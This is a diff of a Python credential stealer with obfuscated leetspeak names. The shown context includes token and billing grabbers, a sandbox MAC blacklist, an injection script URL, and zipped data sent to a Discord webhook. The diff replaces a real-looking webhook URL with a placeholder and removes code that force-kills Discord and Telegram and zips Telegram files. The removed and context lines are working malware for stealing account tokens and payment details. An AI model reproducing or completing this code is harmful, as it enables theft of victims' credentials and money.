@@ -52,7 +52,7 @@ if str(uuid.UUID(int=mac_address)) in BLACKLIST1:
 
 
 
-wh00k = "https://discord.com/api/webhooks/1124656321648668802/acJx--VUDtmU7hR7QLdG1k1kuATv-SOCobNYHk58LPmU8kwsGMqXyrqC3M47gatQRHQH"
+wh00k = "WEBHOOK HERE"
 inj_url = "https://raw.githubusercontent.com/r3nko/injection/main/index.js"
     
 DETECTED = False
@@ -211,13 +211,6 @@ def G3tUHQFr13ndS(t0k3n):
 
 
 process_list = os.popen('tasklist').readlines()
-
-
-for process in process_list:
-    if "Discord" in process:
-        
-        pid = int(process.split()[1])
-        os.system(f"taskkill /F /PID {pid}")
 
 def G3tb1ll1ng(t0k3n):
     headers = {
@@ -714,14 +707,6 @@ def GatherZips(paths1, paths2, paths3):
         "attachments": []
     }
     L04durl1b(wh00k, data=dumps(data).encode(), headers=headers)
-
-
-def ZipTelegram(path, arg, procc):
-    global OtherZip
-    pathC = path
-    name = arg
-    if not os.path.exists(pathC): return
-    subprocess.Popen(f"taskkill /im {procc} /t /f >nul 2>&1", shell=True)
 
     zf = ZipFile(f"{pathC}/{name}.zip", "w")
     for file in os.listdir(pathC):
